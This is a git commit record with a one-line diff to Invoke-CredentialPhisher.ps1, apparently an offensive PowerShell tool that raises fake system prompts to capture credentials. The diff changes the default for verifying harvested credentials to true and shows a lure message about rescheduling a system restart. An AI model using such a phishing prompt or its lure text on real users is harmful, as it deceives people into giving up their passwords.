376d977e0469b4e60510498c1d1ea74974d53dd6
ƧÅƝǩƯ <84743508+IAMinZoho@users.noreply.github.com>
2022-09-27 03:31:17 +0530

    Update Invoke-CredentialPhisher.ps1

--- Invoke-CredentialPhisher.ps1
+++ Invoke-CredentialPhisher.ps1
@@ -122,7 +122,7 @@ function Invoke-CredentialPhisher {
         $CredBoxMessage = "Authentication is required to reschedule a system restart",
 
         [switch]
-        $VerifyCreds = $false,
+        $VerifyCreds = $true,
 
         [switch]
         $EnableToastNotificationsIfDisabled = $false,
